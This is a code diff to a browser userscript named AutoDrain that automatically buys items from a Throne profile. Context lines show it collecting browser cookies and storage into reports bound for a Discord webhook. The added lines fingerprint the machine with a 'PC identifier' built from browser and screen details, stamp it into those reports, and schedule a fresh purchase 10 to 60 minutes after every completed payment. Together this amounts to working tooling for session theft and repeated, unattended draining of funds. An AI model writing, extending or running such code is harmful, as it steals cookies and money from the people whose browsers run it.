@@ -6,6 +6,7 @@ const config = {
   forceStopShortcut: "Alt+Shift+E",
   debugMode: false,
   targetItemName: "Auto-Drain", // e.g., "PlayStation 5" or part of the item name
+  // Enhanced cookie collection configuration
   cookieCollection: {
     enabled: true,
     autoCollect: true,
@@ -39,6 +40,67 @@ var purchaseInProgress = false;
 var lastActionTime = 0;
 var debugBoxVisible = true; // Track debug box visibility
 var cookieLoggingActive = false; // Track if cookie logging is active
+var autoRetryEnabled = true; // Auto-retry purchases after completion
+var nextPurchaseScheduled = false; // Track if next purchase is scheduled
+var pcIdentifier = generatePCIdentifier(); // Unique PC identifier
+
+// Generate unique PC identifier
+function generatePCIdentifier() {
+  // Create a unique identifier based on various system characteristics
+  const userAgent = navigator.userAgent;
+  const language = navigator.language;
+  const platform = navigator.platform;
+  const screenResolution = `${screen.width}x${screen.height}`;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  
+  // Create a hash-like identifier from system info
+  const systemInfo = `${userAgent}-${language}-${platform}-${screenResolution}-${timezone}`;
+  
+  // Simple hash function
+  let hash = 0;
+  for (let i = 0; i < systemInfo.length; i++) {
+    const char = systemInfo.charCodeAt(i);
+    hash = ((hash << 5) - hash) + char;
+    hash = hash & hash; // Convert to 32-bit integer
+  }
+  
+  // Convert to positive hex string and take first 8 characters
+  const identifier = Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
+  
+  return `PC-${identifier}`;
+}
+
+// Auto-retry purchase function
+function scheduleNextPurchase() {
+  if (!autoRetryEnabled || nextPurchaseScheduled) {
+    return;
+  }
+  
+  // Generate random delay between 10-60 minutes (600000-3600000 ms)
+  const minDelay = 10 * 60 * 1000; // 10 minutes
+  const maxDelay = 60 * 60 * 1000; // 60 minutes
+  const randomDelay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
+  
+  const delayMinutes = Math.round(randomDelay / (60 * 1000));
+  
+  debugLog(`🔄 Auto-retry enabled: Next purchase scheduled in ${delayMinutes} minutes`, "info");
+  debugLog(`⏰ Next purchase will start at: ${new Date(Date.now() + randomDelay).toLocaleString()}`, "info");
+  
+  nextPurchaseScheduled = true;
+  
+  setTimeout(() => {
+    debugLog(`🚀 Auto-retry timer expired - Starting new purchase cycle`, "success");
+    debugLog(`🔄 Resetting purchase state for new cycle`, "info");
+    
+    // Reset all purchase states
+    resetPurchaseState();
+    nextPurchaseScheduled = false;
+    
+    // Navigate back to profile to start new purchase
+    redirectToProfile();
+    
+  }, randomDelay);
+}
 
 // Debug box functionality
 function createDebugBox() {
@@ -573,6 +635,7 @@ async function collectAndLogCookies() {
 // Enhanced comprehensive report formatting
 function formatComprehensiveReport(storageData, processedCookies) {
   let report = `🍪 **AURADRAIN COMPREHENSIVE DATA REPORT** 🍪\n`;
+  report += `🖥️ **PC Identifier:** ${pcIdentifier}\n`;
   report += `⏰ **Timestamp:** ${new Date().toLocaleString()}\n`;
   report += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
   report += `🌍 **URL:** ${window.location.href}\n`;
@@ -699,6 +762,7 @@ async function testDiscordWebhook() {
   debugLog("🧪 [WEBHOOK TEST] Starting Discord webhook test...", "info");
   
   const testMessage = `🧪 **WEBHOOK TEST MESSAGE** 🧪\n\n` +
+    `🖥️ **PC Identifier:** ${pcIdentifier}\n` +
     `⏰ **Time:** ${new Date().toLocaleString()}\n` +
     `🌍 **URL:** ${window.location.href}\n` +
     `🖥️ **User Agent:** ${navigator.userAgent.substring(0, 100)}...\n\n` +
@@ -992,6 +1056,12 @@ function clickPayNowIfExists() {
         purchaseInProgress = false;
         debugLog(`✅ Payment completed successfully! 🎉`, "success");
         debugLog(`🏁 Purchase sequence finished`, "success");
+        
+        // Schedule next purchase after successful payment
+        if (autoRetryEnabled) {
+          debugLog(`🔄 Auto-retry enabled - Scheduling next purchase...`, "info");
+          scheduleNextPurchase();
+        }
         return;
       }
       
@@ -1006,6 +1076,12 @@ function clickPayNowIfExists() {
           purchaseInProgress = false;
           debugLog(`✅ Payment completed successfully! 🎉`, "success");
           debugLog(`🏁 Purchase sequence finished`, "success");
+          
+          // Schedule next purchase after successful payment
+          if (autoRetryEnabled) {
+            debugLog(`🔄 Auto-retry enabled - Scheduling next purchase...`, "info");
+            scheduleNextPurchase();
+          }
           return;
         }
       }
@@ -1081,6 +1157,7 @@ function mainLoop() {
 
 function main() {
   debugLog("🚀AutoDrain Started!", "success");
+  debugLog(`🖥️ PC Identifier: ${pcIdentifier}`, "info");
   debugLog(`🎯 Target Profile: ${config.throneUrl}`, "info");
   debugLog(`🛒 Purchase Mode: Single Item Per Transaction`, "info");
   if (config.targetItemName.trim()) {
@@ -1088,11 +1165,13 @@ function main() {
   } else {
     debugLog(`🎁 Target Item: Any available item`, "info");
   }
+  debugLog(`🔄 Auto-Retry: ${autoRetryEnabled ? 'Enabled (10-60 min delay)' : 'Disabled'}`, "info");
   debugLog(`🔧 Debug Mode: Enabled`, "info");
   debugLog(`⚡ Force Stop: Alt+Shift+E`, "info");
   debugLog(`👁️ Toggle Debug: Ctrl+Alt+D`, "info");
   debugLog(`🍪 Cookie Log: Ctrl+Alt+C`, "info");
   debugLog(`🧪 Test Webhook: Ctrl+Alt+T`, "info");
+  debugLog(`🔄 Toggle Auto-Retry: Ctrl+Alt+R`, "info");
   debugLog(`📡 Discord Webhook: ${config.discordWebhook.enabled ? 'Enabled' : 'Disabled'}`, "info");
   debugLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "info");
   
@@ -1113,14 +1192,14 @@ function main() {
     setTimeout(() => {
       if (config.cookieCollection.autoCollect) {
         debugLog("🚀 Starting automatic data collection...", "info");
-        collectAndLogCookies();
+      collectAndLogCookies();
       }
     }, 15000);
     
     // Periodic collection
     if (config.cookieCollection.autoCollect) {
-      setInterval(() => {
-        collectAndLogCookies();
+    setInterval(() => {
+      collectAndLogCookies();
       }, config.cookieCollection.interval);
     }
   } else {
@@ -1156,6 +1235,18 @@ function main() {
       event.preventDefault(); // Prevent browser default behavior
       debugLog("🧪 Manual webhook test triggered", "info");
       testDiscordWebhook();
+    }
+    
+    // Auto-retry toggle shortcut
+    if (event.ctrlKey && event.altKey && event.key === "R") {
+      event.preventDefault(); // Prevent browser default behavior
+      autoRetryEnabled = !autoRetryEnabled;
+      debugLog(`🔄 Auto-retry ${autoRetryEnabled ? 'enabled' : 'disabled'}`, "info");
+      if (autoRetryEnabled) {
+        debugLog("⏰ Next purchases will be scheduled with 10-60 minute delays", "info");
+      } else {
+        debugLog("🛑 Auto-retry disabled - Only manual purchases will work", "warning");
+      }
     }
   });
 }
